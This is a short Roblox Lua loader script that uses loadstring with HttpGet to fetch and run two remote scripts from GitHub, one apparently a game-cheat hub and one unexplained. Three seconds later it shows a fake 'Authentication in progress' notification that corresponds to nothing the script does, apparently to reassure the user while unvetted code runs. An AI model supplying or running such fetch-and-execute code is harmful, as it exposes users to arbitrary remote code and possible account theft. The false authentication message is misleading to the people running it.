-- 1. Run Speed Hub X first
loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()

-- 2. Run your second script immediately after
loadstring(game:HttpGet("https://raw.githubusercontent.com/Updates-Script/Updated/refs/heads/main/Script.lua"))()

-- 3. After 3 seconds, show Roblox-style notification
task.delay(3, function()
    game.StarterGui:SetCore("SendNotification", {
        Title = "Initializing",
        Text = "Authentication in progress... Please wait.",
        Duration = 5
    })
end)
